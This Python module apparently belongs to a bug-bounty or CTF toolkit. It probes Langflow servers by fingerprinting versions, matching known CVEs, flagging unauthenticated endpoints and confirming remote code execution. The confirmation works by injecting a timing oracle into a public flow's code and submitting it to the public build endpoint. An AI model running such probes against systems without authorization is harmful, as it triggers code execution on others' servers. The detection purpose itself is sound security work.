from __future__ import annotations

import copy
import uuid
from collections.abc import Mapping
from typing import Final
from urllib.parse import quote

import requests

from bugbounty_ctf._langflow_support import (
    BuildMeasurement,
    JsonObject,
    JsonValue,
    LangflowBuildExecResult,
    LangflowCveMatch,
    LangflowFetcher,
    LangflowFinding,
    LangflowFingerprint,
    LangflowProbeConfig,
    ResponseLike,
    build_duration,
    flow_data,
    inject_timing_oracle,
    json_object,
    request_error_response,
    requests_response,
    timing_oracle,
)
from bugbounty_ctf._langflow_support import (
    known_cves as _known_cves,
)

__all__ = ["LangflowProbe", "LangflowProbeConfig", "known_cves"]

_INFO_ENDPOINTS: Final[tuple[str, ...]] = (
    "/api/v1/version",
    "/openapi.json",
    "/docs",
    "/api/v1/files/profile_pictures/list",
)


def known_cves(version: str) -> list[LangflowCveMatch]:
    return _known_cves(version)


class LangflowProbe:
    def __init__(
        self,
        base_url: str,
        *,
        config: LangflowProbeConfig | None = None,
        fetcher: LangflowFetcher | None = None,
    ) -> None:
        self.base_url = base_url.rstrip("/")
        self.config = config or LangflowProbeConfig()
        self._session = requests.Session()
        self._fetcher = fetcher or self._default_fetch

    def fingerprint(self) -> LangflowFingerprint | None:
        response = self._request("GET", "/api/v1/version")
        if response.status_code != 200:
            return None
        body = json_object(response)
        if body is None:
            return None
        version = body.get("version")
        if not isinstance(version, str) or not version:
            return None
        package = body.get("package")
        product = package if isinstance(package, str) and package else "Langflow"
        return {"product": product, "version": version}

    def check_unauth_exposure(self) -> list[LangflowFinding]:
        findings: list[LangflowFinding] = []
        for endpoint in _INFO_ENDPOINTS:
            response = self._request("GET", endpoint)
            if response.status_code == 200:
                findings.append(
                    {
                        "type": "langflow-info-disclosure",
                        "endpoint": endpoint,
                        "severity": "medium",
                        "evidence": f"{endpoint} returned HTTP 200 without authentication",
                        "confidence": "high",
                    }
                )

        for flow_id in self.config.public_flow_ids:
            endpoint = _public_flow_endpoint(flow_id)
            response = self._request("GET", endpoint)
            if response.status_code == 200:
                findings.append(
                    {
                        "type": "langflow-public-flow-read",
                        "endpoint": endpoint,
                        "severity": "medium",
                        "evidence": "public flow definition returned HTTP 200 without authentication",
                        "confidence": "high",
                    }
                )
        return findings

    def check_public_build_exec(self, flow_id: str | None = None) -> LangflowBuildExecResult:
        selected_flow_id = self._selected_flow_id(flow_id)
        if selected_flow_id is None:
            return {
                "vulnerable": False,
                "confidence": "unconfirmed",
                "evidence": "no public flow id supplied or configured",
                "baseline_s": None,
                "injected_s": None,
                "delta_s": None,
            }

        public_flow = self._read_public_flow(selected_flow_id)
        if public_flow is None:
            return {
                "vulnerable": False,
                "confidence": "unconfirmed",
                "evidence": "public flow could not be read without authentication",
                "baseline_s": None,
                "injected_s": None,
                "delta_s": None,
            }

        public_flow_data = flow_data(public_flow)
        client_id = str(uuid.uuid4())
        baseline = self._submit_and_measure(selected_flow_id, public_flow_data, client_id)
        if baseline.duration_s is None:
            return {
                "vulnerable": False,
                "confidence": "unconfirmed",
                "evidence": baseline.evidence,
                "baseline_s": None,
                "injected_s": None,
                "delta_s": None,
            }

        injected_flow = copy.deepcopy(public_flow_data)
        if not inject_timing_oracle(injected_flow, timing_oracle(self.config.sleep_s)):
            return {
                "vulnerable": False,
                "confidence": "unconfirmed",
                "evidence": "no node code field found for benign timing oracle",
                "baseline_s": baseline.duration_s,
                "injected_s": None,
                "delta_s": None,
            }

        injected = self._submit_and_measure(selected_flow_id, injected_flow, client_id)
        if injected.duration_s is None:
            return {
                "vulnerable": False,
                "confidence": "unconfirmed",
                "evidence": injected.evidence,
                "baseline_s": baseline.duration_s,
                "injected_s": None,
                "delta_s": None,
            }

        delta_s = round(injected.duration_s - baseline.duration_s, 3)
        threshold_s = max(
            self.config.sleep_s - self.config.timing_tolerance_s, self.config.sleep_s / 2
        )
        if delta_s >= threshold_s:
            return {
                "vulnerable": True,
                "confidence": "high",
                "evidence": (
                    "benign timing oracle confirmed execution: "
                    f"baseline={baseline.duration_s:.3f}s "
                    f"injected={injected.duration_s:.3f}s delta={delta_s:.3f}s"
                ),
                "baseline_s": baseline.duration_s,
                "injected_s": injected.duration_s,
                "delta_s": delta_s,
            }
        return {
            "vulnerable": False,
            "confidence": "unconfirmed",
            "evidence": (
                "timing oracle did not confirm execution: "
                f"baseline={baseline.duration_s:.3f}s "
                f"injected={injected.duration_s:.3f}s delta={delta_s:.3f}s"
            ),
            "baseline_s": baseline.duration_s,
            "injected_s": injected.duration_s,
            "delta_s": delta_s,
        }

    def _default_fetch(
        self,
        method: str,
        url: str,
        *,
        timeout: float,
        cookies: Mapping[str, str] | None = None,
        json: JsonValue | None = None,
    ) -> ResponseLike:
        response = self._session.request(
            method,
            url,
            timeout=timeout,
            cookies=dict(cookies) if cookies is not None else None,
            json=json,
        )
        return requests_response(response)

    def _request(
        self,
        method: str,
        endpoint: str,
        *,
        cookies: Mapping[str, str] | None = None,
        json: JsonValue | None = None,
    ) -> ResponseLike:
        try:
            return self._fetcher(
                method,
                f"{self.base_url}{endpoint}",
                timeout=self.config.timeout_s,
                cookies=cookies,
                json=json,
            )
        except requests.RequestException as exc:
            return request_error_response(exc)

    def _selected_flow_id(self, flow_id: str | None) -> str | None:
        if flow_id:
            return flow_id
        if self.config.public_flow_ids:
            return self.config.public_flow_ids[0]
        return None

    def _read_public_flow(self, flow_id: str) -> JsonObject | None:
        response = self._request("GET", _public_flow_endpoint(flow_id))
        if response.status_code != 200:
            return None
        return json_object(response)

    def _submit_and_measure(
        self, flow_id: str, flow_data: JsonObject, client_id: str
    ) -> BuildMeasurement:
        build_endpoint = f"/api/v1/build_public_tmp/{quote(flow_id, safe='')}/flow"
        response = self._request(
            "POST",
            build_endpoint,
            cookies={"client_id": client_id},
            json={"data": flow_data},
        )
        if response.status_code != 200:
            return BuildMeasurement(None, f"{build_endpoint} returned HTTP {response.status_code}")
        body = json_object(response)
        if body is None:
            return BuildMeasurement(None, "build endpoint did not return JSON")
        job_id = body.get("job_id")
        if not isinstance(job_id, str) or not job_id:
            return BuildMeasurement(None, "build endpoint did not return a job_id")
        events_endpoint = f"/api/v1/build_public_tmp/{quote(job_id, safe='')}/events"
        events_response = self._request("GET", events_endpoint)
        if events_response.status_code != 200:
            return BuildMeasurement(
                None,
                f"{events_endpoint} returned HTTP {events_response.status_code}",
            )
        duration_s = build_duration(events_response)
        if duration_s is None:
            return BuildMeasurement(None, "events stream did not include build_duration")
        return BuildMeasurement(duration_s, f"events reported build_duration={duration_s:.3f}s")


def _public_flow_endpoint(flow_id: str) -> str:
    return f"/api/v1/flows/public_flow/{quote(flow_id, safe='')}"
